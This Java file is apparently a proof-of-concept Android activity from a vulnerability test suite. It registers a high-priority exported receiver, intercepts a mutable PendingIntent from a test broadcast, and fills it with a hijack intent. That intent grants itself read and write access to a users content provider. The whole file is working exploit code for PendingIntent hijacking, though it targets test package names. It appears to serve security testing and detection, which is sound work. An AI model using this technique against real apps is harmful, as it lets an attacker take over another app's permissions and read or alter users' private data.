package sherlock.poc.mutable_pending_intent;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ClipData;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

public class InterceptBroadcastActivity extends AppCompatActivity {

    private static final String TAG = "sherlock.poc.mutable_pending_intent.InterceptBroadcastActivity";

    public static Intent newIntent(Context packageContext) {
        return new Intent(packageContext, InterceptBroadcastActivity.class);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Toast.makeText(this, "Registering receiver with action: sherlock.test.PENDING_INTENT_BROADCAST", Toast.LENGTH_SHORT).show();

        IntentFilter filter = new IntentFilter("sherlock.test.MUTABLE_PENDING_INTENT_BROADCAST");
        filter.setPriority(999);
        registerReceiver(receiver, filter, RECEIVER_EXPORTED);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        unregisterReceiver(receiver);
    }

    private final BroadcastReceiver receiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.i(TAG, "Received intent: " + intent.getAction());

            PendingIntent pi = intent.getParcelableExtra("unsafe");
            Intent hijackIntent = new Intent("sherlock.poc.TARGET_ACTIVITY");
            hijackIntent.setClipData(ClipData.newRawUri(null, Uri.parse("content://sherlock.test.users_provider/users")));
            hijackIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
            if (pi != null) {
                try {
                    pi.send(context, 1001, hijackIntent, null, null);
                } catch (PendingIntent.CanceledException e) {
                    Log.e(TAG, "Failed to send pending intent: " + e);
                }
            }
        }
    };
}
